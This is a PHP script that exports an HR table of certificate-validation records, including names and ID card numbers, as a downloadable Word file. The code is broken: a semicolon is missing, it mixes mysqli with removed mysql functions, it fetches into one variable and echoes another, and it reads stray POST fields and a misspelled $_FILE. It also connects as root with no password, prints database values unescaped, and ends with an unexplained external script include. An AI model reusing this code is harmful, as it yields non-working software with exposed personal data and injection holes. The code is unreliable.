<?php

header("Content-type: application/vnd.ms-word");
header("Content-Disposition: attachment; filename=Reporte_de_Registro_de_Validacion.doc");


$conexion=mysqli_connect("localhost","root","","rrhh")


?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head/>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>LISTA DE REGISTROS</title>
</head>
<body data-rsssl=1>
<table width="100%" border="1" cellspacing="0" cellpadding="0">
  <tr>
    <td colspan="6" bgcolor="skyblue"><CENTER><strong>REPORTE DE REGISTROS</strong></CENTER></td>
  </tr>
  <tr bgcolor="red">
    <td class="text-center">ID</td>
    <td class="text-center">Nombres</td>
    <td class="text-center">Apellidos</td>
    <td class="text-center">Código de Certificado</td>
    <td class="text-center">Carnet de Identidad</td>
    <td class="text-center">Fcha de Evento</td>
    <td class="text-center">Organizado por:</td>
    <td class="text-center">Certificado de:</td>
    <td class="text-center">Documento</td>
  </tr>
  
<?PHP
$sql=mysql_query("SELECT `ID_Validar`, `Nombres`, `Apellidos`, `CI`, `cod_qr`, `fecha`, `org`, `certde`, `Doc` FROM validar_cert");
while($res=mysql_fetch_array($sql)){

  $ID_Validar = $_POST['ID_Validar'];
    $Nombres = $_POST['Nombres'];
    $Apellidos = $_POST['Apellidos'];
    $CI = $_POST['CI'];
    $cod_qr = $_POST['cod_qr'];
    $fecha = $_POST['fecha'];
    $org = $_POST['org'];
    $certde = $_POST['certde'];
    $Doc = $_FILE['Doc']['name'];

?>  
 <tr>
<td><?php echo $row['ID_Validar']; ?></td>
<td><?php echo $row['Nombres']; ?></td>
<td><?php echo $row['Apellidos']; ?></td>
<td><?php echo $row['CI']; ?></td>
<td><?php echo $row['cod_qr']; ?></td>
<td><?php echo $row['fecha']; ?></td>
<td><?php echo $row['org']; ?></td>
<td><?php echo $row['certde']; ?></td>
  <td><?php echo $row['Doc']; ?></td>       
 </tr> 
  <?php
}
  ?>
</table>
<script src="/s/f.php?d22993.js" async defer></script></body>
</html>